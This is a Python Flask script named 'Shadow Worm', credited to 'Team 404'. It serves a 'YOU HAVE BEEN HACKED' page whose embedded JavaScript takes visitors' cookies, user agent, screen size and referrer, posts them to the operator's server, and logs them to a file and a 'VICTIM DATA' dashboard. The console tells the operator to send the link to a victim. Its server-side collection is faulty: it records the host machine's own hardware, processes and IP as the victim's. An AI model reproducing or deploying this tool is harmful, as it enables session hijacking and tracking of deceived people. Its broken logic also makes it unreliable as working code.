import os
import sys
import json
import time
import socket
import platform
import subprocess
import requests
import uuid
import re
import psutil
from flask import Flask, request

app = Flask(__name__)

victim_data = []

# لرفع على Render.com
PORT = int(os.environ.get('PORT', 5000))

def get_device_info():
    info = {}
    
    print("\n[+] Collecting device information...")
    
    # 1. IP Addresses
    try:
        info["public_ip"] = requests.get('https://api.ipify.org', timeout=5).text
        print(f"    [+] Public IP: {info['public_ip']}")
    except:
        info["public_ip"] = "Unknown"
        print("    [-] Public IP: Unknown")
    
    try:
        info["local_ip"] = socket.gethostbyname(socket.gethostname())
        print(f"    [+] Local IP: {info['local_ip']}")
    except:
        info["local_ip"] = "127.0.0.1"
        print("    [-] Local IP: Unknown")
    
    # 2. Hostname
    try:
        info["hostname"] = socket.gethostname()
        print(f"    [+] Hostname: {info['hostname']}")
    except:
        info["hostname"] = "Unknown"
        print("    [-] Hostname: Unknown")
    
    # 3. OS Information
    info["os"] = platform.system()
    info["os_version"] = platform.version()
    info["kernel"] = platform.release()
    print(f"    [+] OS: {info['os']}")
    print(f"    [+] OS Version: {info['os_version'][:50]}")
    print(f"    [+] Kernel: {info['kernel']}")
    
    # 4. Architecture
    info["architecture"] = platform.machine()
    info["platform"] = platform.platform()
    print(f"    [+] Architecture: {info['architecture']}")
    print(f"    [+] Platform: {info['platform'][:50]}")
    
    # 5. CPU - Using psutil
    try:
        info["cpu"] = platform.processor() or "Unknown"
        info["cpu_cores"] = psutil.cpu_count()
        info["cpu_freq"] = f"{psutil.cpu_freq().current} MHz" if psutil.cpu_freq() else "Unknown"
        info["cpu_load"] = f"{psutil.cpu_percent(interval=1)}%"
        print(f"    [+] CPU: {info.get('cpu', 'Unknown')}")
        print(f"    [+] CPU Cores: {info['cpu_cores']}")
        print(f"    [+] CPU Frequency: {info.get('cpu_freq', 'Unknown')}")
        print(f"    [+] CPU Load: {info.get('cpu_load', 'Unknown')}")
    except:
        info["cpu"] = "Unknown"
        info["cpu_cores"] = os.cpu_count()
        print("    [-] CPU: Unknown")
    
    # 6. RAM - Using psutil
    try:
        mem = psutil.virtual_memory()
        info["ram_total"] = f"{round(mem.total / (1024**3), 2)} GB"
        info["ram_used"] = f"{round(mem.used / (1024**3), 2)} GB"
        info["ram_free"] = f"{round(mem.free / (1024**3), 2)} GB"
        info["ram_percent"] = f"{mem.percent}%"
        print(f"    [+] RAM Total: {info['ram_total']}")
        print(f"    [+] RAM Used: {info['ram_used']}")
        print(f"    [+] RAM Free: {info['ram_free']}")
        print(f"    [+] RAM Percent: {info['ram_percent']}")
    except:
        info["ram_total"] = "Unknown"
        print("    [-] RAM: Unknown")
    
    # 7. Swap Memory
    try:
        swap = psutil.swap_memory()
        info["swap_total"] = f"{round(swap.total / (1024**3), 2)} GB"
        info["swap_used"] = f"{round(swap.used / (1024**3), 2)} GB"
        info["swap_free"] = f"{round(swap.free / (1024**3), 2)} GB"
        print(f"    [+] Swap Total: {info['swap_total']}")
        print(f"    [+] Swap Used: {info['swap_used']}")
        print(f"    [+] Swap Free: {info['swap_free']}")
    except:
        print("    [-] Swap Memory: Unknown")
    
    # 8. Storage - Using psutil
    try:
        disk = psutil.disk_usage('/')
        info["storage_total"] = f"{round(disk.total / (1024**3), 2)} GB"
        info["storage_used"] = f"{round(disk.used / (1024**3), 2)} GB"
        info["storage_free"] = f"{round(disk.free / (1024**3), 2)} GB"
        info["storage_percent"] = f"{disk.percent}%"
        print(f"    [+] Storage Total: {info['storage_total']}")
        print(f"    [+] Storage Used: {info['storage_used']}")
        print(f"    [+] Storage Free: {info['storage_free']}")
        print(f"    [+] Storage Percent: {info['storage_percent']}")
    except:
        info["storage_total"] = "Unknown"
        print("    [-] Storage: Unknown")
    
    # 9. MAC Address
    try:
        mac = uuid.getnode()
        info["mac"] = ':'.join(('{:02x}'.format((mac >> elements) & 0xff) for elements in range(0, 8*6, 8)))[::-1]
        print(f"    [+] MAC Address: {info['mac']}")
    except:
        info["mac"] = "Unknown"
        print("    [-] MAC Address: Unknown")
    
    # 10. GPU - Android specific
    try:
        if os.path.exists('/sys/class/kgsl/kgsl-3d0/gpu_model'):
            with open('/sys/class/kgsl/kgsl-3d0/gpu_model', 'r') as f:
                info["gpu"] = f.read().strip()
        elif os.path.exists('/sys/class/graphics/fb0/device/name'):
            with open('/sys/class/graphics/fb0/device/name', 'r') as f:
                info["gpu"] = f.read().strip()
        else:
            info["gpu"] = "Unknown"
        print(f"    [+] GPU: {info.get('gpu', 'Unknown')}")
    except:
        info["gpu"] = "Unknown"
        print("    [-] GPU: Unknown")
    
    # 11. Battery - Using psutil
    try:
        battery = psutil.sensors_battery()
        if battery:
            info["battery"] = f"{battery.percent}%"
            info["battery_plugged"] = "Charging" if battery.power_plugged else "Discharging"
            info["battery_seconds"] = battery.secsleft if battery.secsleft != -1 else "Unknown"
            print(f"    [+] Battery: {info['battery']}")
            print(f"    [+] Battery Status: {info['battery_plugged']}")
        else:
            info["battery"] = "Unknown"
            print("    [-] Battery: Unknown")
    except:
        info["battery"] = "Unknown"
        print("    [-] Battery: Unknown")
    
    # 12. Device Model - Android specific
    try:
        if os.path.exists('/system/build.prop'):
            with open('/system/build.prop', 'r') as f:
                for line in f:
                    if 'ro.product.model' in line:
                        info["device_model"] = line.split('=')[1].strip()
                        print(f"    [+] Device Model: {info['device_model']}")
                        break
                    elif 'ro.product.device' in line:
                        info["device_model"] = line.split('=')[1].strip()
                        print(f"    [+] Device Model: {info['device_model']}")
                        break
    except:
        pass
    
    # 13. Android Version
    try:
        info["android_version"] = os.popen('getprop ro.build.version.release').read().strip()
        if info["android_version"]:
            print(f"    [+] Android Version: {info['android_version']}")
    except:
        pass
    
    # 14. Time and Date
    info["timezone"] = time.tzname[0]
    info["timestamp"] = time.ctime()
    print(f"    [+] Timezone: {info['timezone']}")
    print(f"    [+] Timestamp: {info['timestamp']}")
    
    # 15. Boot Time - Using psutil
    try:
        boot_time = psutil.boot_time()
        info["boot_time"] = time.ctime(boot_time)
        uptime_seconds = int(time.time() - boot_time)
        days = uptime_seconds // 86400
        hours = (uptime_seconds % 86400) // 3600
        minutes = (uptime_seconds % 3600) // 60
        info["uptime"] = f"{days}d {hours}h {minutes}m"
        print(f"    [+] Boot Time: {info['boot_time']}")
        print(f"    [+] Uptime: {info['uptime']}")
    except:
        print("    [-] Boot Time: Unknown")
    
    # 16. Language
    info["language"] = os.environ.get('LANG', 'en_US.UTF-8')
    print(f"    [+] Language: {info['language']}")
    
    # 17. Username
    try:
        info["username"] = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'Unknown')
        print(f"    [+] Username: {info['username']}")
    except:
        info["username"] = "Unknown"
        print("    [-] Username: Unknown")
    
    # 18. Python Version
    info["python_version"] = sys.version[:30]
    print(f"    [+] Python Version: {info['python_version']}")
    
    # 19. Network Interfaces
    try:
        info["network"] = str(socket.if_nameindex())
        print(f"    [+] Network Interfaces: {len(socket.if_nameindex())} interfaces")
    except:
        info["network"] = "Unknown"
        print("    [-] Network Interfaces: Unknown")
    
    # 20. Network Stats - Using psutil
    try:
        net_io = psutil.net_io_counters()
        info["bytes_sent"] = f"{round(net_io.bytes_sent / (1024**3), 2)} GB"
        info["bytes_recv"] = f"{round(net_io.bytes_recv / (1024**3), 2)} GB"
        info["packets_sent"] = net_io.packets_sent
        info["packets_recv"] = net_io.packets_recv
        print(f"    [+] Bytes Sent: {info['bytes_sent']}")
        print(f"    [+] Bytes Received: {info['bytes_recv']}")
        print(f"    [+] Packets Sent: {info['packets_sent']}")
        print(f"    [+] Packets Received: {info['packets_recv']}")
    except:
        print("    [-] Network Stats: Unknown")
    
    # 21. Disk IO - Using psutil
    try:
        disk_io = psutil.disk_io_counters()
        if disk_io:
            info["disk_read"] = f"{round(disk_io.read_bytes / (1024**3), 2)} GB"
            info["disk_write"] = f"{round(disk_io.write_bytes / (1024**3), 2)} GB"
            print(f"    [+] Disk Read: {info['disk_read']}")
            print(f"    [+] Disk Write: {info['disk_write']}")
        else:
            print("    [-] Disk IO: Unknown")
    except:
        print("    [-] Disk IO: Unknown")
    
    # 22. Process Info - Using psutil
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent']):
            try:
                pinfo = proc.info
                processes.append(f"{pinfo['pid']}: {pinfo['name']} (CPU: {pinfo['cpu_percent']:.1f}%, MEM: {pinfo['memory_percent']:.1f}%)")
            except:
                pass
        info["processes"] = processes[:10]  # First 10 processes
        print(f"    [+] Running Processes: {len(processes)} total")
    except:
        print("    [-] Processes: Unknown")
    
    print("\n[+] Data collection completed!")
    print("="*50)
    
    return info

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>phono ks haked</title>
        <style>
            body { background: #0a0a0a; color: #00ff00; font-family: monospace; text-align: center; padding: 50px; }
            h1 { color: #ff0000; font-size: 48px; text-shadow: 0 0 20px red; }
            .box { border: 2px solid #00ff00; padding: 20px; margin: 20px auto; max-width: 600px; border-radius: 10px; }
        </style>
    </head>
    <body>
        <h1>DONE</h1>
        <div class="box">
            <h2>YOU HAVE BEEN HACKED</h2>
            <p>Your device is hacked by Team 404.</p>
            <script>
                var data = {
                    screen: screen.width + "x" + screen.height,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    cookies: document.cookie,
                    referrer: document.referrer,
                    href: window.location.href
                };
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
            </script>
        </div>
    </body>
    </html>
    """

@app.route('/collect', methods=['POST'])
def collect():
    global victim_data
    data = request.json
    device_info = get_device_info()
    
    if data:
        device_info["screen"] = data.get("screen", "Unknown")
        device_info["browser"] = data.get("userAgent", "Unknown")
        device_info["cookies"] = data.get("cookies", "Unknown")
        device_info["referrer"] = data.get("referrer", "Unknown")
        device_info["href"] = data.get("href", "Unknown")
        device_info["headers"] = dict(request.headers)
        device_info["remote_addr"] = request.remote_addr
    
    victim_data.append(device_info)
    
    with open("victims_data.json", "a") as f:
        json.dump(device_info, f)
        f.write("\n")
    
    print("\n[+] ===== VICTIM DATA =====")
    print(f"    IP: {device_info.get('public_ip', 'Unknown')}")
    print(f"    OS: {device_info.get('os', 'Unknown')}")
    print(f"    CPU: {device_info.get('cpu', 'Unknown')}")
    print(f"    RAM: {device_info.get('ram_total', 'Unknown')}")
    print(f"    Storage: {device_info.get('storage_total', 'Unknown')}")
    print(f"    Battery: {device_info.get('battery', 'Unknown')}")
    print(f"    Screen: {device_info.get('screen', 'Unknown')}")
    print("="*50)
    
    return {"status": "ok"}

@app.route('/data')
def view_data():
    if not victim_data:
        return "No data collected yet"
    
    html = "<html><body style='background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;'><h1>VICTIM DATA</h1>"
    for i, data in enumerate(victim_data[-10:]):
        html += f"<div style='border:1px solid #00ff00;padding:10px;margin:10px 0;'><h3>Victim {i+1}</h3>"
        for key, value in data.items():
            if isinstance(value, dict):
                continue
            html += f"<p><strong>{key}:</strong> {str(value)[:200]}</p>"
        html += "</div>"
    html += "</body></html>"
    return html

def generate_link():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        link = f"https://{local_ip}:{PORT}/"  # Changed to https for Render
        print("\n[+] LINK GENERATED")
        print("="*50)
        print("Send this link to victim:")
        print(f"   {link}")
        print("="*50)
        return link
    except Exception as e:
        print("[!] Error generating link: " + str(e))
        return None

def web_join():
    print("\n[+] Web server is running...")
    print("[+] Waiting for victim...")
    print("[+] Press CTRL+C to stop\n")
    app.run(host='0.0.0.0', port=PORT, debug=False)

def main():
    os.system('clear')
    print("""
   >---------------------------------------------<
   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( S | H | A | D | O | W |   | W | O | R | M )  
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
        VICTIM DATA COLLECTOR
        By Team 404
  >---------------------------------------------<
    """)
    
    print("[*] Starting Shadow Worm...")
    time.sleep(1)
    
    link = generate_link()
    
    if link:
        web_join()
    else:
        print("[!] Failed to generate link")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        sys.exit(0)